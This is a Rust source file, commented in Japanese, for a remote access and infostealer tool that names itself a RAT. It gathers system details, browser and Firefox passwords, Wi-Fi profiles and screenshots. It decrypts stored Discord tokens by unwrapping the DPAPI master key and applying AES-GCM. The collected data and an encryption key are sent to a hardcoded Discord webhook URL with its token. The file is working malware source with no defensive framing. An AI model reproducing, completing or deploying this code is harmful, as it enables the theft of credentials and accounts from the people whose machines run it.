// 標準ライブラリ
use std::process::Command;
#[cfg(windows)]
use std::os::windows::process::CommandExt;

// 外部クレート
use serde::{Serialize, Deserialize};
use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};

// 条件付きインポート
#[cfg(feature = "screenshot")]
use crate::modules::screen_capture::ScreenshotConfig;

// カスタムエラー型の定義
#[derive(Debug)]
pub enum RatError {
    Io(std::io::Error),
    Serialization(serde_json::Error),
    Encryption(String),
    Command(String),
    Config(String),
}

impl std::fmt::Display for RatError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            RatError::Io(err) => write!(f, "I/O error: {}", err),
            RatError::Serialization(err) => write!(f, "Serialization error: {}", err),
            RatError::Encryption(msg) => write!(f, "Encryption error: {}", msg),
            RatError::Command(msg) => write!(f, "Command error: {}", msg),
            RatError::Config(msg) => write!(f, "Configuration error: {}", msg),
        }
    }
}

impl std::error::Error for RatError {}

impl From<std::io::Error> for RatError {
    fn from(err: std::io::Error) -> Self {
        RatError::Io(err)
    }
}

impl From<serde_json::Error> for RatError {
    fn from(err: serde_json::Error) -> Self {
        RatError::Serialization(err)
    }
}

pub type RatResult<T> = Result<T, RatError>;

// モジュールシステム
pub mod modules;
pub mod browser_profiles;
pub mod password_manager;
// pub mod cli;  // 元のclapベースCLI
pub mod cli_args;  // 標準ライブラリベースCLI
pub use cli_args as cli;  // 互換性のため
pub mod data_exporter; 
pub mod firefox_nss;
// Only include browser collector when the feature is enabled
#[cfg(feature = "browser")]
pub mod browser_scanner;
pub mod auth_tokens;

// 新しいモジュールからの公開API
pub use browser_profiles::{get_profile_path, get_default_profile};
pub use password_manager::{JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin};
pub use cli::Args;

// 最小限のシステム情報構造体
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SystemInfo {
    pub hostname: String,
    pub username: String,
    pub os_name: String,
    pub os_version: String,
    pub os_arch: String,
    pub cpu_info: String,
    pub memory_total_gb: f64,
    pub memory_available_gb: f64,
    pub disk_info: Vec<DiskInfo>,
    pub uptime_hours: f64,
    pub local_ip: String,
    pub public_ip: Option<String>,
    pub network_interfaces: Vec<NetworkInterface>,
    pub timezone: String,
    pub locale: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DiskInfo {
    pub drive_letter: String,
    pub file_system: String,
    pub total_size_gb: f64,
    pub free_space_gb: f64,
    pub used_percentage: f64,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct NetworkInterface {
    pub name: String,
    pub ip_address: String,
    pub mac_address: String,
    pub interface_type: String,
}

// 最小限の認証データ構造体
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AuthData {
    pub passwords: Vec<String>,
    pub wifi_creds: Vec<String>,
}

// スクリーンショットデータ構造体
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ScreenshotData {
    pub primary_display: Option<String>,      // Base64エンコードされたプライマリディスプレイ
    pub all_displays: Vec<String>,            // Base64エンコードされた全ディスプレイ
    pub capture_time: String,                 // キャプチャ時刻
    pub total_count: usize,                   // 取得したスクリーンショット数
}

// 統合設定構造体
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Config {
    // 基本設定
    pub collect_auth_data: bool,
    pub timeout_seconds: u64,
    
    // Webhook設定
    pub webhook_url: String,
    pub webhook_type: String,
    pub webhook_enabled: bool,
    
    // 収集設定
    pub collect_screenshots: bool,
    pub collect_webcam: bool,
    pub collect_processes: bool,
    pub collect_software: bool,
    pub collect_browser_passwords: bool,
    pub collect_browser_cookies: bool,
    pub collect_wifi_passwords: bool,
    pub collect_api_keys: bool,
    pub collect_ssh_keys: bool,
    pub collect_firefox_passwords: bool,
    pub collect_discord_tokens: bool,
    
    // モジュール設定
    pub enabled_modules: Vec<String>,
    pub execution_order: Vec<String>,
    pub output_format: String,
    pub max_execution_time: u64,
    
    // 制限設定
    pub max_processes: u32,
    pub retry_attempts: u32,
}

impl Default for Config {
    fn default() -> Self {
        let enabled_modules = vec![
            "network".to_string(),
            "browser".to_string(),
            "screenshot".to_string(),
            "webhook".to_string(),
        ];
        
        Config {
            // 基本設定
            collect_auth_data: true,
            timeout_seconds: 45,
            
            // Webhook設定（デフォルトで有効）
            webhook_url: "".to_string(),
            webhook_type: "Discord".to_string(),
            webhook_enabled: true,
            
            // 収集設定
            collect_screenshots: true,
            collect_webcam: false,
            collect_processes: true,
            collect_software: true,
            collect_browser_passwords: true,
            collect_browser_cookies: false,
            collect_wifi_passwords: true,
            collect_api_keys: false,
            collect_ssh_keys: false,
            collect_firefox_passwords: true,
            collect_discord_tokens: true,
            
            // モジュール設定
            enabled_modules: enabled_modules.clone(),
            execution_order: enabled_modules,
            output_format: "Encrypted".to_string(),
            max_execution_time: 240,
            
            // 制限設定
            max_processes: 15,
            retry_attempts: 2,
        }
    }
}

// OS詳細情報取得
fn get_os_details() -> (String, String) {
    #[cfg(windows)]
    {
        let version = Command::new("cmd")
            .args(&["/C", "ver"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .unwrap_or_else(|| "Unknown".to_string())
            .trim()
            .to_string();
        
        let arch = std::env::consts::ARCH.to_string();
        (version, arch)
    }
    #[cfg(not(windows))]
    {
        let version = Command::new("uname")
            .args(&["-r"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .unwrap_or_else(|| "Unknown".to_string())
            .trim()
            .to_string();
        
        let arch = std::env::consts::ARCH.to_string();
        (version, arch)
    }
}

// CPU情報取得
fn get_cpu_info() -> String {
    #[cfg(windows)]
    {
        Command::new("wmic")
            .args(&["cpu", "get", "name", "/format:value"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .and_then(|s| s.lines().find(|line| line.starts_with("Name=")).map(|line| line[5..].to_string()))
            .unwrap_or_else(|| "Unknown CPU".to_string())
    }
    #[cfg(not(windows))]
    {
        std::fs::read_to_string("/proc/cpuinfo")
            .ok()
            .and_then(|content| content.lines()
                .find(|line| line.starts_with("model name"))
                .map(|line| line.split(':').nth(1).unwrap_or("Unknown").trim().to_string()))
            .unwrap_or_else(|| "Unknown CPU".to_string())
    }
}

// メモリ情報取得
fn get_memory_info() -> (f64, f64) {
    #[cfg(windows)]
    {
        // より簡単なwmicコマンドを試す
        let total = Command::new("wmic")
            .args(&["computersystem", "get", "TotalPhysicalMemory"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .and_then(|s| {
                for line in s.lines() {
                    if let Ok(bytes) = line.trim().parse::<u64>() {
                        if bytes > 1000000 { // 妥当な値かチェック
                            return Some(bytes as f64 / 1_073_741_824.0);
                        }
                    }
                }
                None
            })
            .unwrap_or_else(|| {
                // 代替手段: PowerShellを使用
                Command::new("powershell")
                    .args(&["-Command", "(Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum"])
                    .output()
                    .ok()
                    .and_then(|output| String::from_utf8(output.stdout).ok())
                    .and_then(|s| s.trim().parse::<u64>().ok())
                    .map(|bytes| bytes as f64 / 1_073_741_824.0)
                    .unwrap_or(16.0) // フォールバック値
            });

        let available = Command::new("wmic")
            .args(&["OS", "get", "FreePhysicalMemory"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .and_then(|s| {
                for line in s.lines() {
                    if let Ok(kb) = line.trim().parse::<u64>() {
                        if kb > 100000 { // 妥当な値かチェック
                            return Some(kb as f64 / 1_048_576.0);
                        }
                    }
                }
                None
            })
            .unwrap_or_else(|| {
                // 代替手段: PowerShellを使用
                Command::new("powershell")
                    .args(&["-Command", "(Get-WmiObject -Class Win32_OperatingSystem).FreePhysicalMemory"])
                    .output()
                    .ok()
                    .and_then(|output| String::from_utf8(output.stdout).ok())
                    .and_then(|s| s.trim().parse::<u64>().ok())
                    .map(|kb| kb as f64 / 1_048_576.0)
                    .unwrap_or(8.0) // フォールバック値
            });

        (total, available)
    }
    #[cfg(not(windows))]
    {
        let meminfo = std::fs::read_to_string("/proc/meminfo").unwrap_or_default();
        let total = meminfo.lines()
            .find(|line| line.starts_with("MemTotal:"))
            .and_then(|line| line.split_whitespace().nth(1))
            .and_then(|s| s.parse::<u64>().ok())
            .map(|kb| kb as f64 / 1_048_576.0)
            .unwrap_or(0.0);

        let available = meminfo.lines()
            .find(|line| line.starts_with("MemAvailable:"))
            .and_then(|line| line.split_whitespace().nth(1))
            .and_then(|s| s.parse::<u64>().ok())
            .map(|kb| kb as f64 / 1_048_576.0)
            .unwrap_or(0.0);

        (total, available)
    }
}

// ディスク情報取得
fn get_disk_info() -> Vec<DiskInfo> {
    let mut disks = Vec::new();
    
    #[cfg(windows)]
    {
        // より簡単なwmicコマンドを試す
        if let Ok(output) = Command::new("wmic")
            .args(&["logicaldisk", "get", "size,freespace,filesystem,deviceid"])
            .output()
        {
            if let Ok(output_str) = String::from_utf8(output.stdout) {
                let lines: Vec<&str> = output_str.lines().collect();
                
                // ヘッダー行をスキップし、データ行を処理
                for line in lines.iter().skip(1) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 4 && parts[0].ends_with(':') {
                        if let (Ok(free_space), Ok(total_size)) = (
                            parts[2].parse::<u64>(),
                            parts[3].parse::<u64>()
                        ) {
                            if total_size > 0 {
                                let total_gb = total_size as f64 / 1_073_741_824.0;
                                let free_gb = free_space as f64 / 1_073_741_824.0;
                                let used_percentage = ((total_size - free_space) as f64 / total_size as f64) * 100.0;
                                
                                disks.push(DiskInfo {
                                    drive_letter: parts[0].to_string(),
                                    file_system: parts[1].to_string(),
                                    total_size_gb: total_gb,
                                    free_space_gb: free_gb,
                                    used_percentage,
                                });
                            }
                        }
                    }
                }
            }
        }
        
        // 代替手段: PowerShellを使用
        if disks.is_empty() {
            if let Ok(output) = Command::new("powershell")
                .args(&["-Command", "Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FileSystem, Size, FreeSpace | ConvertTo-Csv -NoTypeInformation"])
                .output()
            {
                if let Ok(output_str) = String::from_utf8(output.stdout) {
                    for line in output_str.lines().skip(1) { // Skip header
                        let parts: Vec<&str> = line.trim_matches('"').split("\",\"").collect();
                        if parts.len() >= 4 {
                            if let (Ok(total_size), Ok(free_space)) = (
                                parts[2].parse::<u64>(),
                                parts[3].parse::<u64>()
                            ) {
                                if total_size > 0 {
                                    let total_gb = total_size as f64 / 1_073_741_824.0;
                                    let free_gb = free_space as f64 / 1_073_741_824.0;
                                    let used_percentage = ((total_size - free_space) as f64 / total_size as f64) * 100.0;
                                    
                                    disks.push(DiskInfo {
                                        drive_letter: parts[0].to_string(),
                                        file_system: parts[1].to_string(),
                                        total_size_gb: total_gb,
                                        free_space_gb: free_gb,
                                        used_percentage,
                                    });
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    if disks.is_empty() {
        disks.push(DiskInfo {
            drive_letter: "C:".to_string(),
            file_system: "NTFS".to_string(),
            total_size_gb: 1000.0, // フォールバック値
            free_space_gb: 500.0,   // フォールバック値  
            used_percentage: 50.0,   // フォールバック値
        });
    }
    
    disks
}

// システム稼働時間取得
fn get_uptime_hours() -> f64 {
    #[cfg(windows)]
    {
        Command::new("wmic")
            .args(&["os", "get", "lastbootuptime", "/format:value"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .and_then(|s| s.lines()
                .find(|line| line.starts_with("LastBootUpTime="))
                .map(|_| 0.0)) // 簡略化: 実際の計算は複雑
            .unwrap_or(0.0)
    }
    #[cfg(not(windows))]
    {
        std::fs::read_to_string("/proc/uptime")
            .ok()
            .and_then(|content| content.split_whitespace().next())
            .and_then(|s| s.parse::<f64>().ok())
            .map(|seconds| seconds / 3600.0)
            .unwrap_or(0.0)
    }
}

// パブリックIP取得
fn get_public_ip() -> Option<String> {
    // HTTP リクエストなしで None を返す
    None
}

// ネットワークインターフェース情報取得
fn get_network_interfaces() -> Vec<NetworkInterface> {
    let mut interfaces = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(output) = Command::new("ipconfig")
            .args(&["/all"])
            .output()
        {
            if let Ok(_output_str) = String::from_utf8(output.stdout) {
                // 簡略化: 基本的なパース
                interfaces.push(NetworkInterface {
                    name: "Ethernet".to_string(),
                    ip_address: "192.168.1.100".to_string(),
                    mac_address: "00:00:00:00:00:00".to_string(),
                    interface_type: "Ethernet".to_string(),
                });
            }
        }
    }
    
    if interfaces.is_empty() {
        interfaces.push(NetworkInterface {
            name: "Unknown".to_string(),
            ip_address: "0.0.0.0".to_string(),
            mac_address: "00:00:00:00:00:00".to_string(),
            interface_type: "Unknown".to_string(),
        });
    }
    
    interfaces
}

// タイムゾーン取得
fn get_timezone() -> String {
    #[cfg(windows)]
    {
        Command::new("tzutil")
            .args(&["/g"])
            .output()
            .ok()
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .map(|s| s.trim().to_string())
            .unwrap_or_else(|| "UTC".to_string())
    }
    #[cfg(not(windows))]
    {
        std::env::var("TZ").unwrap_or_else(|_| "UTC".to_string())
    }
}

// ロケール取得
fn get_locale() -> String {
    std::env::var("LANG")
        .or_else(|_| std::env::var("LC_ALL"))
        .unwrap_or_else(|_| "en_US.UTF-8".to_string())
}

// 詳細システム情報収集（統合版）
pub fn get_system_info() -> RatResult<SystemInfo> {
    let hostname = whoami::fallible::hostname()
        .map_err(|_| RatError::Command("Failed to get hostname".to_owned()))?;
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "Unknown".to_owned());
    let os_name = std::env::consts::OS.to_owned();
    let local_ip = local_ipaddress::get()
        .unwrap_or_else(|| "Unknown".to_owned());

    // OS詳細情報
    let (os_version, os_arch) = get_os_details();
    let cpu_info = get_cpu_info();
    let (memory_total_gb, memory_available_gb) = get_memory_info();
    let disk_info = get_disk_info();
    let uptime_hours = get_uptime_hours();
    let public_ip = get_public_ip();
    let network_interfaces = get_network_interfaces();
    let timezone = get_timezone();
    let locale = get_locale();

    Ok(SystemInfo {
        hostname,
        username,
        os_name,
        os_version,
        os_arch,
        cpu_info,
        memory_total_gb,
        memory_available_gb,
        disk_info,
        uptime_hours,
        local_ip,
        public_ip,
        network_interfaces,
        timezone,
        locale,
    })
}

// 認証データ収集（統合版）
pub fn collect_auth_data() -> AuthData {
    collect_auth_data_with_config(&Config::default())
}

pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
    // 並列処理を順次処理に変更（標準ライブラリ版）
    let passwords = collect_all_passwords(config);
    let wifi_creds = if config.collect_wifi_passwords { 
        collect_wifi_credentials() 
    } else { 
        Vec::new() 
    };

    AuthData { passwords, wifi_creds }
}

// 全パスワード収集（統合版）
fn collect_all_passwords(config: &Config) -> Vec<String> {
    let mut passwords = Vec::with_capacity(256);
    
    if config.collect_browser_passwords {
        passwords.extend(collect_browser_passwords());
    }
    
    if config.collect_discord_tokens {
        match extract_discord_tokens() {
            Ok(tokens) => passwords.extend(tokens),
            Err(_) => passwords.push("Discord token extraction failed".to_string()),
        }
    }
    
    passwords
}

// ブラウザパスワード収集（統合最適化版 - chomeium_dump統合）
#[cfg(feature = "browser")]
fn collect_browser_passwords() -> Vec<String> {
    // 統合ブラウザデータ収集機能を使用（ChromiumとFirefox両方対応）
    match crate::browser_scanner::collect_browser_passwords_simple() {
        Ok(passwords) => {
            if passwords.is_empty() {
                vec!["No browser passwords found".to_string()]
            } else {
                passwords
            }
        }
        Err(e) => {
            vec![format!("Browser password collection failed: {}", e)]
        }
    }
}

// Discord トークン収集統合版（token_dump.rs機能統合）
fn extract_discord_tokens() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut tokens = Vec::new();
    
    if !cfg!(windows) {
        return Ok(tokens);
    }
    
    // Discord自動検出＆トークン復号化
    match extract_discord_tokens_advanced() {
        Ok(decrypted_tokens) => {
            let token_count = decrypted_tokens.len();
            if token_count == 0 {
                tokens.push("Discord統合モジュール: トークンは見つかりませんでした".to_string());
            } else {
                tokens.extend(decrypted_tokens);
                tokens.push(format!("✅ Discord統合モジュール: {}個のトークンを復号化", token_count));
            }
        },
        Err(e) => {
            tokens.push(format!("⚠️ Discord統合モジュール: {}", e));
            
            // フォールバック: 従来の検索
            if let Ok(user) = std::env::var("USERPROFILE") {
                let discord_paths = vec![
                    format!("{}\\AppData\\Roaming\\discord\\Local Storage\\leveldb", user),
                    format!("{}\\AppData\\Roaming\\Discord\\Local Storage\\leveldb", user),
                ];
                
                for path in discord_paths {
                    if std::path::Path::new(&path).exists() {
                        tokens.push(format!("Discord directory found: {}", path));
                    }
                }
            }
        }
    }
    
    if tokens.is_empty() {
        tokens.push("No Discord installation found".to_string());
    }
    
    Ok(tokens)
}

// 高度なDiscordトークン抽出機能（token_dump.rs統合版）
#[cfg(windows)]
fn extract_discord_tokens_advanced() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    use std::{ptr, ffi::c_void, fs};
    use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
    
    // Windows DPAPI FFI
    #[link(name = "crypt32")]
    extern "system" {
        fn CryptUnprotectData(
            pDataIn: *const DataBlob,
            ppszDataDescr: *mut *mut u16,
            pOptionalEntropy: *const DataBlob,
            pvReserved: *mut c_void,
            pPromptStruct: *mut c_void,
            dwFlags: u32,
            pDataOut: *mut DataBlob,
        ) -> i32;
    }
    
    #[link(name = "kernel32")]
    extern "system" {
        fn LocalFree(hMem: *mut c_void) -> *mut c_void;
    }
    
    #[repr(C)]
    struct DataBlob {
        cb_data: u32,
        pb_data: *mut u8,
    }
    
    // DPAPI復号関数
    fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        unsafe {
            let in_blob = DataBlob {
                cb_data: data.len() as u32,
                pb_data: data.as_ptr() as *mut u8,
            };
            let mut out_blob = DataBlob {
                cb_data: 0,
                pb_data: ptr::null_mut(),
            };
            
            let result = CryptUnprotectData(
                &in_blob,
                ptr::null_mut(),
                ptr::null(),
                ptr::null_mut(),
                ptr::null_mut(),
                1, // CRYPTPROTECT_UI_FORBIDDEN
                &mut out_blob,
            );
            
            if result != 0 {
                let slice = std::slice::from_raw_parts(out_blob.pb_data, out_blob.cb_data as usize);
                let decrypted_data = slice.to_vec();
                LocalFree(out_blob.pb_data as *mut c_void);
                Ok(decrypted_data)
            } else {
                Err("DPAPI decryption failed".into())
            }
        }
    }
    
    // Discord自動検出（標準ライブラリ使用）
    let config_dir = get_config_dir()?;
    let discord_path = config_dir.join("discord");
    
    if !discord_path.exists() {
        return Err("Discord directory not found".into());
    }
    
    // Local State読み込み
    let local_state_path = discord_path.join("Local State");
    if !local_state_path.exists() {
        return Err("Discord Local State not found".into());
    }
    
    let json = fs::read_to_string(&local_state_path)?;
    let v: serde_json::Value = serde_json::from_str(&json)?;
    let enc_key_b64 = v["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or("Encrypted key not found")?;
    
    let enc_key = BASE64.decode(enc_key_b64)?;
    if !enc_key.starts_with(b"DPAPI") {
        return Err("Invalid key format".into());
    }
    
    let master_key = dpapi_unprotect(&enc_key[5..])?;
    
    // LDBファイル検索
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
    if !leveldb_path.exists() {
        return Err("LevelDB directory not found".into());
    }
    
    let mut tokens = Vec::new();
    let entries = fs::read_dir(&leveldb_path)?;
    
    for entry in entries {
        let entry = entry?;
        let path = entry.path();
        
        if path.extension().map_or(false, |ext| ext == "ldb") {
            if let Ok(data) = fs::read(&path) {
                let content = String::from_utf8_lossy(&data);
                
                // トークン検索
                let pattern = "dQw4w9WgXcQ:";
                let mut start = 0;
                
                while let Some(pos) = content[start..].find(pattern) {
                    let token_start = start + pos + pattern.len();
                    let remaining = &content[token_start..];
                    
                    let token_end = remaining
                        .find(|c: char| c == '"' || c == '\0' || c == '\n' || c.is_control())
                        .unwrap_or(remaining.len());
                    
                    if token_end > 20 {
                        let encrypted = &remaining[..token_end];
                        
                        // AES復号化
                        if let Ok(data) = BASE64.decode(encrypted) {
                            if data.len() >= 31 && data.starts_with(b"v10") {
                                let iv = &data[3..15];
                                let ciphertext = &data[15..data.len() - 16];
                                let tag = &data[data.len() - 16..];
                                
                                if let Ok(cipher) = Aes256Gcm::new_from_slice(&master_key) {
                                    let mut payload = ciphertext.to_vec();
                                    payload.extend_from_slice(tag);
                                    let nonce = Nonce::from_slice(iv);
                                    
                                    if let Ok(plaintext) = cipher.decrypt(nonce, payload.as_ref()) {
                                        let token = String::from_utf8_lossy(&plaintext);
                                        tokens.push(format!("Discord Token: {}", token));
                                    }
                                }
                            }
                        }
                    }
                    
                    start = token_start + token_end;
                }
            }
        }
    }
    
    Ok(tokens)
}

#[cfg(not(windows))]
fn extract_discord_tokens_advanced() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    Err("Discord token extraction is only supported on Windows".into())
}

// WiFi認証情報収集（分離）
fn collect_wifi_credentials() -> Vec<String> {
    let mut wifi_creds = Vec::with_capacity(16);
    
    if cfg!(windows) {
        if let Ok(output) = Command::new("netsh")
            .args(["wlan", "show", "profiles"])
            .creation_flags(0x08000000)
            .output() {
            let profiles_text = String::from_utf8_lossy(&output.stdout);
            
            wifi_creds.extend(
                profiles_text
                    .lines()
                    .filter(|line| line.contains("All User Profile"))
                    .filter_map(|line| line.split(':').nth(1))
                    .map(|name| name.trim().to_owned())
                    .filter(|name| !name.is_empty())
            );
        }
    }
    
    wifi_creds
}

// 管理者権限チェック
#[cfg(windows)]
pub fn is_admin() -> bool {
    use windows::{
        Win32::Foundation::*,
        Win32::Security::*,
        Win32::System::Threading::*,
    };
    
    unsafe {
        let mut token = HANDLE::default();
        let process = GetCurrentProcess();
        
        if OpenProcessToken(
            process,
            TOKEN_QUERY,
            &mut token
        ).is_err() {
            return false;
        }
        
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
        
        let result = GetTokenInformation(
            token,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut std::ffi::c_void),
            size,
            &mut size
        );
        
        let _ = CloseHandle(token);
        
        result.is_ok() && elevation.TokenIsElevated != 0
    }
}

#[cfg(not(windows))]
pub fn is_admin() -> bool {
    false
}

// 暗号化機能（統合最適化版）
pub fn encrypt_data(data: &[u8]) -> RatResult<Vec<u8>> {
    use rand::RngCore;
    
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rand::rng().fill_bytes(&mut key);
    rand::rng().fill_bytes(&mut nonce);

    let encrypted = encrypt_data_with_key(data, &key, &nonce)?;
    
    // キー、ノンス、データを統合
    let mut result = Vec::with_capacity(44 + encrypted.len());
    result.extend_from_slice(&key);
    result.extend_from_slice(&nonce);
    result.extend_from_slice(&encrypted);
    Ok(result)
}

// 標準ライブラリによるディレクトリ取得（dirsクレート置換）
fn get_config_dir() -> RatResult<std::path::PathBuf> {
    #[cfg(windows)]
    {
        if let Ok(appdata) = std::env::var("APPDATA") {
            Ok(std::path::PathBuf::from(appdata))
        } else {
            Err(RatError::Config("APPDATA environment variable not found".to_string()))
        }
    }
    #[cfg(not(windows))]
    {
        if let Ok(home) = std::env::var("HOME") {
            Ok(std::path::PathBuf::from(home).join(".config"))
        } else {
            Err(RatError::Config("HOME environment variable not found".to_string()))
        }
    }
}

#[allow(dead_code)]
fn get_home_dir() -> RatResult<std::path::PathBuf> {
    #[cfg(windows)]
    {
        if let Ok(userprofile) = std::env::var("USERPROFILE") {
            Ok(std::path::PathBuf::from(userprofile))
        } else {
            Err(RatError::Config("USERPROFILE environment variable not found".to_string()))
        }
    }
    #[cfg(not(windows))]
    {
        if let Ok(home) = std::env::var("HOME") {
            Ok(std::path::PathBuf::from(home))
        } else {
            Err(RatError::Config("HOME environment variable not found".to_string()))
        }
    }
}

// キー管理機能は削除されました - 直接入力のみサポート

// 低レベル暗号化
pub fn encrypt_data_with_key(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> RatResult<Vec<u8>> {
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
    cipher.encrypt(Nonce::from_slice(nonce), data)
        .map_err(|e| RatError::Encryption(format!("Encryption failed: {:?}", e)))
}

// 復号化機能
pub fn decrypt_data(encrypted_data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> RatResult<Vec<u8>> {
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
    cipher.decrypt(Nonce::from_slice(nonce), encrypted_data)
        .map_err(|e| RatError::Encryption(format!("Decryption failed: {:?}", e)))
}

// ハードコードされた設定を取得（config.json不使用）
pub fn load_config_or_default() -> Config {
    // ハードコード設定を使用
    get_hardcoded_config()
}

// ハードコードされた設定（旧config.jsonの内容を直接埋め込み）
fn get_hardcoded_config() -> Config {
    Config {
        collect_auth_data: true,
        timeout_seconds: 45,
        webhook_url: "https://discordapp.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
        webhook_type: "Discord".to_string(),
        webhook_enabled: true,
        collect_screenshots: true,
        collect_webcam: false,
        collect_processes: true,
        collect_software: true,
        collect_browser_passwords: true,
        collect_browser_cookies: false,
        collect_wifi_passwords: true,
        collect_api_keys: false,
        collect_ssh_keys: false,
        collect_firefox_passwords: true,
        collect_discord_tokens: true,
        enabled_modules: vec![
            "network".to_string(),
            "browser".to_string(),
            "screenshot".to_string(),
            "webhook".to_string(),
        ],
        execution_order: vec![
            "network".to_string(),
            "browser".to_string(),
            "screenshot".to_string(),
            "webhook".to_string(),
        ],
        output_format: "Encrypted".to_string(),
        max_execution_time: 240,
        max_processes: 15,
        retry_attempts: 2,
    }
}

// Webhook機能付きメイン実行関数
#[cfg(feature = "webhook")]
pub fn run_with_webhook(config: &Config) -> RatResult<()> {
    use crate::modules::notification_sender::{WebhookConfig, WebhookType, send_webhook};
    
    // RAT-64 実行開始（Webhook機能有効）
    
    // システム情報収集
    let system_info = get_system_info()?;
    // システム情報収集完了
    
    // 認証データ収集（設定に基づく）
    let auth_data = if config.collect_auth_data {
        collect_auth_data_with_config(&config)
    } else {
        AuthData {
            passwords: vec![],
            wifi_creds: vec![],
        }
    };
    // 認証データ収集完了
    
    // WebhookConfig作成
    let webhook_config = WebhookConfig {
        webhook_url: if config.webhook_url.is_empty() {
            None
        } else {
            Some(config.webhook_url.clone())
        },
        webhook_type: match config.webhook_type.as_str() {
            "Discord" => WebhookType::Discord,
            "Slack" => WebhookType::Slack,
            "Custom" => WebhookType::Custom,
            _ => WebhookType::None,
        },
        retry_attempts: config.retry_attempts,
        timeout_seconds: config.timeout_seconds,
    };
    
    // Webhook送信
    if webhook_config.webhook_url.is_some() {
        let _ = send_webhook(&webhook_config, &system_info, &auth_data);
    }
    
    // スクリーンショット機能（オプション）
    let screenshot_data = {
        #[cfg(feature = "screenshot")]
        if config.collect_screenshots {
            match crate::modules::screen_capture::capture_all_displays(&ScreenshotConfig::default()) {
                Ok(screenshot_data) => {
                    let total_count = screenshot_data.len();
                    ScreenshotData {
                        primary_display: screenshot_data.get(0).cloned(),
                        all_displays: screenshot_data,
                        capture_time: format!("{:?}", std::time::SystemTime::now()),
                        total_count,
                    }
                },
                Err(_) => {
                    ScreenshotData {
                        primary_display: None,
                        all_displays: Vec::new(),
                        capture_time: format!("{:?}", std::time::SystemTime::now()),
                        total_count: 0,
                    }
                }
            }
        } else {
            ScreenshotData {
                primary_display: None,
                all_displays: Vec::new(),
                capture_time: format!("{:?}", std::time::SystemTime::now()),
                total_count: 0,
            }
        }
        
        #[cfg(not(feature = "screenshot"))]
        {
            ScreenshotData {
                primary_display: None,
                all_displays: Vec::new(),
                capture_time: format!("{:?}", std::time::SystemTime::now()),
                total_count: 0,
            }
        }
    };
    
    // データ暗号化と保存
    if config.output_format == "Encrypted" {
        // データ構造体作成
        #[derive(serde::Serialize)]
        struct FullData {
            system_info: SystemInfo,
            auth_data: AuthData,
            screenshot_data: ScreenshotData,
        }
        
        let full_data = FullData {
            system_info: system_info.clone(),
            auth_data: auth_data.clone(),
            screenshot_data,
        };
        
        // MessagePackでシリアライズ
        match rmp_serde::to_vec(&full_data) {
            Ok(serialized_data) => {
                // キーとナンス生成
                use rand::RngCore;
                let mut key = [0u8; 32];
                let mut nonce = [0u8; 12];
                rand::rng().fill_bytes(&mut key);
                rand::rng().fill_bytes(&mut nonce);
                
                // 暗号化処理（キー分離形式）
                match encrypt_data_with_key(&serialized_data, &key, &nonce) {
                    Ok(encrypted_data) => {
                        // データ保存
                        match std::fs::write("data.dat", &encrypted_data) {
                            Ok(_) => {
                                // Webhookで暗号化キーを送信（full機能時）
                                #[cfg(feature = "webhook")]
                                if webhook_config.webhook_url.is_some() {
                                    let _ = crate::modules::notification_sender::send_encryption_key_webhook(&webhook_config, &key, &nonce);
                                }
                            },
                            Err(_) => {},
                        }
                    },
                    Err(_) => {},
                }
            },
            Err(_) => {},
        }
    }
    
    Ok(())
}

// Webhook機能なしのフォールバック
#[cfg(not(feature = "webhook"))]
pub fn run_with_webhook(_config: &Config) -> RatResult<()> {
    Err(RatError::Io(std::io::Error::new(std::io::ErrorKind::Other, "Webhook機能が無効です")))
}

// Fallback implementation when the "browser" feature is disabled
#[cfg(not(feature = "browser"))]
fn collect_browser_passwords() -> Vec<String> {
    vec!["Browser collection feature is disabled in this build".to_string()]
}
